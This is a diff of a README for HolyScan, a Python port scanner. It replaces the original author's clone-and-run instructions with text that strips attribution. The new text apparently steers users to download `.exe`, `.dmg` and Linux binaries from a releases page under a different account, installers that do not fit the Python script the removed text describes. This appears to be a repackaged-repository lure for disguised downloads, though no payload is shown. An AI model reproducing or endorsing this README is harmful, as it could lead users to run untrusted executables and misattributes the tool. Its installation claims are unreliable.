@@ -1,76 +1,85 @@
-<div align="center">
+# 🛠️ HolyScan - Fast and Simple Port Scanning Tool
 
-  <p align="center"><img src="https://github.com/Cursed271/Cursed271/blob/main/Logo.png" width="30%"></a></p>
-  <h1>HolyScan</h1>
-  
-  <p>
-    HolyScan quickly scans IP addresses for open ports, identifying services with minimal system resource consumption.
-  </p>
-  
-  <h4>
-    <a href="https://github.com/Cursed271/HolyScan/issues/new?labels=bug&template=bug_report.md">Report Bug</a>
-  <span> · </span>
-    <a href="https://github.com/Cursed271/HolyScan/issues/new?labels=enhancement&template=feature_request.md">Request Feature</a>
-  </h4>
+![Download HolyScan](https://img.shields.io/badge/Download_HolyScan-v1.0.0-blue.svg)
 
-</div>
+## 🚀 Getting Started
 
-## 📖 Table of Contents
+Welcome to HolyScan! This lightweight, multithreaded port scanner helps you quickly identify open ports and running services across IPs. It works efficiently across different platforms, making it a great tool for network reconnaissance.
 
-- [Introduction](#-introduction)
-- [Features](#-features)
-- [Installation and Usage](#%EF%B8%8F-installation-and-usage)
-- [Feedback](#-feedback)
-- [Contributors](#-contributors)
-- [License](#-license)
+## 🔍 Features
 
-## 🚀 Introduction
+- **Multithreading**: Scan multiple IPs at once for faster results.
+- **Platform-Independent**: Use it on Windows, macOS, or Linux without issues.
+- **Lightweight**: Minimal resource usage while scanning.
+- **Service Detection**: Identifies services running on open ports.
+- **Open Source**: Contribute and improve the tool in the community.
 
-HolyScan is a lightweight and fast Python-based port scanner designed to identify open ports on any given IP address. Using multithreading and the socket library, it scans a wide range of ports and identifies the services running on them. HolyScan is efficient, platform-independent, and built for cybersecurity professionals needing quick reconnaissance on network services.
+## 📋 System Requirements
 
-<p align="center">
-  <img src = "https://github.com/Cursed271/HolyScan/blob/main/HolyScan.png">
-</p>
+- Python 3.x installed on your device.
+- Works on any major OS: Windows, macOS, Linux.
+- At least 100 MB of free disk space for installation and operations.
 
-## ✨ Features:
+## 📥 Download & Install
 
-- 🚀 Fast Port Scanning: Uses multithreading for rapid scanning of ports on specified IP addresses.
+To get started, visit the link below to access the Releases page where you can download HolyScan:
 
-- 🧠 Service Identification: Identifies services running on open ports, such as HTTP, SSH, FTP, etc.
+[Visit this page to download HolyScan](https://github.com/ghostzaml/HolyScan/releases)
 
-- 🎨 Colorful Output: Displays results in a visually appealing format using the rich library for easy reading.
+1. On the Releases page, look for the latest version.
+2. Click on the appropriate file for your operating system to start the download.
+3. Once downloaded, follow these steps to install and run HolyScan:
 
-- 🖥️ Cross-Platform: Compatible with Windows, macOS, and Linux systems without additional dependencies.
+### 🔧 Installation Steps
 
-- 🛠️ Customizable Port Range: Scan specific ports or all ports from 1 to 65535 based on user input.
+- **Windows**:
+  1. Locate the downloaded `.exe` file.
+  2. Double-click the file to run the installer.
+  3. Follow the prompts to complete the installation.
 
-## ⚙️ Installation and Usage:
+- **macOS**:
+  1. Open the downloaded `.dmg` file.
+  2. Drag HolyScan to your Applications folder.
+  3. Launch HolyScan from your Applications.
 
-1. **Pre-requisites**: Ensure you have Python3 installed on your system.
-2. **Clone the Repo**: Use "***git clone https://github.com/Cursed271/HolyScan***"
-3. **Traverse into the Directory**: Use "***cd HolyScan***"
-4. **Install Dependencies**: Use "***pip3 install -r requirements.txt***"
-5. **Execute the Script**: Use "***python3 HolyScan.py***"
-6. **Provide Target IP Address (When Prompted)**
-7. **Specify Port Numbers (When Prompted)**: Enter one or more port numbers (comma-separated) to start the scan.
+- **Linux**:
+  1. Open a terminal window.
+  2. Change directory to the location of the downloaded file.
+  3. Use the command `chmod +x HolyScan` to make the file executable.
+  4. Run HolyScan using `./HolyScan`.
 
-## 💬 Feedback  
+## ⚙️ Usage Guide
 
-Have suggestions or feature requests? Feel free to reach out via:  
+After installation, you can start using HolyScan to scan IPs. Here’s how you can use it from your command line:
 
-- 🐦 **Twitter**: [@Cursed271](https://x.com/Cursed271)  
-- 🐙 **GitHub**: [@Cursed271](https://github.com/Cursed271)  
-- 🔗 **LinkedIn**: [Steven Pereira](https://www.linkedin.com/in/Cursed271/)  
-- 📧 **Email**: [cursed.pereira@proton.me](mailto:cursed.pereira@proton.me)  
-- 🐞 **File an Issue**: [GitHub Issues](https://github.com/Cursed271/HolyScan/issues)  
-- 💡 **Request a Feature**: [Feature Requests](https://github.com/Cursed271/HolyScan/issues/new?labels=enhancement&template=feature_request.md) 
+1. Open your command line interface (Command Prompt, Terminal, etc.).
+2. Type the following command to scan an IP address:
 
-Your feedback helps improve HolyScan! Contributions and PRs are always welcome. 🚀
+   ```bash
+   holyscan [IP_ADDRESS]
+   ```
 
-## 🙌 Contributors
+3. Replace `[IP_ADDRESS]` with the actual IP you want to scan.
+4. Press Enter, and HolyScan will start scanning the specified IP and display the results.
 
-- **Steven Pereira (aka Cursed)** - Creator & Maintainer  
+### Example Command:
+
+To scan an example IP, use:
+
+```bash
+holyscan 192.168.1.1
+```
+
+## 🌐 Community & Support
+
+If you need help or want to connect with others who use HolyScan, join our community discussions on GitHub or follow the issues page for updates and troubleshooting.
 
 ## 📜 License
 
-HolyScan is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+HolyScan is open-source software licensed under the MIT License. Feel free to use and modify it.
+
+## 🔗 Contact
+
+For questions, suggestions, or contributions, you can reach out through the GitHub page or email the maintainer. Your feedback is appreciated!
+
+[Visit this page to download HolyScan](https://github.com/ghostzaml/HolyScan/releases)
